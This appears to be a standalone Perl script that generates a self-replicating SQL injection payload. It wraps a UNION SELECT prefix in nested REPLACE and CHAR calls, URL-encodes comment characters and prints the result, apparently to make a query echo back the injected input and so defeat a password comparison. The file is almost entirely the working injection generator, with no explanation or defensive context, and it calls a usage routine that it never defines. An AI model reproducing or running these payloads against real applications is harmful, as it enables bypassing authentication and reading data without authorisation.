#!/usr/bin/perl
use strict;
use warnings;

sub quine {
	my $req   = shift;
	$req =~ /([a-zA-Z]+)(['"])(.*)/ or &usage;

	my $var    = $1;
	my $quote1 = $2;
	my $rest   = $3;
	my $quote2 = $quote1 eq '"' ? "'" : '"';

	my $quine  = <<"EOF";
${var}${quote1}${rest}REPLACE(REPLACE(${quote1}${var}${quote2}${rest}
REPLACE(REPLACE(${quote2}\$${quote2},CHAR(34),CHAR(39)),CHAR(36),
${quote2}\$${quote2})#
${quote1},CHAR(34),CHAR(39)),CHAR(36),${quote1}${var}${quote2}${rest}
REPLACE(REPLACE(${quote2}\$${quote2},CHAR(34),CHAR(39)),CHAR(36),
${quote2}\$${quote2})#${quote1})#
EOF

	$quine =~ s/\#/%23/g;
	$quine =~ s/\n//gr;
}

#print(quine('X" union select '));
print(quine("X' union select "));

# End of file.
